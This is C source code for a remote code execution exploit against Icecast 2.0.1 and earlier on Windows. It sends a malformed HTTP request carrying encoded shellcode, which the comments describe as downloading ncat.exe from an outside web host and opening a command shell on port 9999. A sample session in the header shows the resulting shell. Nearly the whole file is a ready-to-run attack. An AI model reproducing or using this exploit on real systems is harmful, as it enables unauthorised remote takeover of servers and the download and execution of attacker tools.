/*

by Luigi Auriemma

Shellcode add-on by Delikon
www.Delikon.de

Because of all the forbidden bytes in a http get request
i had to use a very small shellcode, which was blown up
by Msf::Encoder::PexAlphaNum. Great encoder.
-------------------------------------------------------------------------
C:\>iceexec 127.0.0.1

Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:    http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target   127.0.0.1:8000
- send malformed data

Server IS vulnerable!!!


C:\>nc 127.0.0.1 9999
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Icecast2 Win32>
---------------------------------------------------------------------------


*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
	#pragma comment(lib, "ws2_32.lib")
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <netinet/in.h>
#endif



#define VER     "0.1"
#define PORT    8000
#define BUFFSZ  2048
#define TIMEOUT 3
#define EXEC    "GET / HTTP/1.0\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "\xcc"
//web download and execution shellcode
//which downloads http://www.elitehaven.net/ncat.exe
//this ncat spwans a shell on port 9999
char shellcode[] = "\xEB"
"\x03\x59\xEB\x05\xE8\xF8\xFF\xFF\xFF\x4F\x49\x49\x49\x49\x49\x49\x51\x5A\x56\x54"
"\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36\x48\x48\x30\x42\x33\x30\x42\x43\x56"
"\x58\x32\x42\x44\x42\x48\x34\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30"
"\x41\x44\x41\x56\x58\x34\x5A\x38\x42\x44\x4A\x4F\x4D\x49\x4E\x4E\x4C\x42\x30\x42"
"\x50\x42\x50\x4F\x35\x4A\x4E\x48\x55\x42\x50\x42\x30\x42\x50\x49\x48\x43\x4C\x42"
"\x45\x4A\x46\x50\x58\x50\x34\x50\x50\x4E\x4E\x4A\x4E\x42\x36\x42\x50\x42\x30\x42"
"\x30\x41\x43\x49\x4C\x48\x56\x49\x4B\x4F\x36\x50\x46\x41\x55\x4A\x56\x45\x57\x44"
"\x57\x4E\x36\x4D\x46\x46\x55\x4F\x4F\x42\x4D\x42\x45\x4A\x46\x48\x43\x4C\x41\x4F"
"\x32\x42\x57\x4A\x4E\x48\x44\x42\x50\x42\x30\x42\x30\x41\x43\x49\x4C\x41\x55\x41"
"\x35\x4D\x48\x47\x53\x48\x55\x4D\x38\x47\x47\x4A\x50\x48\x35\x41\x35\x4F\x4F\x42"
"\x4D\x43\x55\x4A\x56\x4A\x59\x50\x4F\x4C\x38\x50\x30\x4A\x4E\x4D\x32\x42\x50\x42"
"\x30\x42\x30\x41\x55\x47\x35\x4F\x4F\x42\x4D\x41\x53\x49\x4C\x49\x34\x44\x4E\x50"
"\x4F\x43\x35\x4A\x46\x50\x37\x4A\x4D\x44\x4E\x43\x47\x4A\x4E\x49\x41\x42\x30\x42"
"\x50\x42\x30\x4F\x4F\x42\x4D\x45\x55\x48\x55\x46\x46\x41\x4A\x42\x53\x42\x30\x42"
"\x30\x42\x30\x4B\x48\x42\x44\x4E\x30\x4B\x58\x42\x37\x4E\x51\x4D\x4A\x4B\x48\x4A"
"\x56\x4A\x30\x49\x58\x4A\x4E\x50\x45\x4D\x55\x43\x4C\x43\x35\x45\x45\x48\x55\x47"
"\x35\x4B\x48\x4E\x46\x46\x42\x4A\x31\x4B\x58\x45\x54\x4E\x33\x4B\x58\x46\x35\x45"
"\x30\x4A\x57\x41\x50\x4C\x4E\x4B\x38\x4C\x34\x4A\x41\x4B\x58\x4C\x55\x42\x52\x41"
"\x50\x4B\x4E\x43\x4E\x45\x43\x49\x54\x4B\x48\x46\x53\x4B\x48\x41\x50\x50\x4E\x41"
"\x53\x4F\x4F\x4E\x4F\x41\x43\x42\x4C\x4E\x4A\x4A\x43\x42\x4E\x46\x37\x47\x50\x41"
"\x4C\x4F\x4C\x4D\x50\x41\x30\x47\x4C\x4B\x4E\x44\x4F\x4B\x33\x4E\x37\x46\x52\x46"
"\x51\x45\x47\x41\x4E\x4B\x48\x4C\x35\x46\x42\x41\x50\x4B\x4E\x48\x56\x4B\x58\x4E"
"\x50\x4B\x44\x4B\x58\x4C\x55\x4E\x31\x41\x30\x4B\x4E\x4B\x48\x46\x50\x4B\x58\x41"
"\x30\x4A\x4E\x49\x4E\x44\x30\x42\x50\x42\x50\x42\x50\x41\x53\x42\x4C\x49\x58\x4C"
"\x4E\x4F\x55\x50\x35\x4D\x45\x4B\x55\x43\x4C\x4A\x4E\x4F\x42\x4F\x4F\x4F\x4F\x4F"
"\x4F\x4D\x36\x4A\x46\x4A\x56\x50\x52\x45\x56\x4A\x57\x45\x46\x42\x30\x4A\x56\x46"
"\x47\x46\x57\x42\x57\x4C\x43\x4F\x42\x4F\x32\x47\x47\x47\x47\x47\x47\x50\x42\x45"
"\x36\x4E\x56\x49\x36\x46\x57\x45\x56\x4A\x36\x41\x36\x48\x57\x45\x36\x50\x56\x50"
"\x32\x50\x46\x45\x36\x46\x47\x4F\x42\x50\x46\x43\x36\x41\x56\x46\x37\x50\x32\x45"
"\x36\x4A\x37\x45\x46\x42\x50\x5A";


/*
 in my example 0xcc is used to interrupt the code execution, you must
 put your shellcode exactly there.
 You don't need to call a shellcode offset (CALL ESP, JMP ESP and so
 on) or doing any other annoying operation because the code flow
 points directly there!!!
 Cool and easy 8-)
*/


int startWinsock(void)
{
  WSADATA wsa;
  return WSAStartup(MAKEWORD(2,0),&wsa);
}



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u_short port = PORT;
    u_char  buff[BUFFSZ];
	UCHAR buf[4096];
	UCHAR *pointer=NULL;
	


    setbuf(stdout, NULL);

    fputs("\n"
        "Icecast <= 2.0.1 Win32 remote code execution "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
		"\nshellcode add-on by Delikon\n"
		"www.delikon.de"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUsage: %s <server> [port(%d)]\n"
            "\n"
            "Note: This exploit will force the Icecast server to download NCAT\n"
            "      and after execution it will spwan a shell on 9999\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
	
    startWinsock();
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    memset(buf,0x00,sizeof(buf));
    strcpy(buf,EXEC);
    
	pointer =strrchr(buf,0xcc);
	
	strcpy(pointer,shellcode);
	
	


	
	strcat(buf,"\r\n");
	strcat(buf,"\r\n");
    

    printf("\n- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    fputs("- send malformed data\n", stdout);
    if(send(sd, buf, strlen(buf), 0)
      < 0) std_err();

    if((timeout(sd) < 0) || (recv(sd, buff, BUFFSZ, 0) < 0)) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


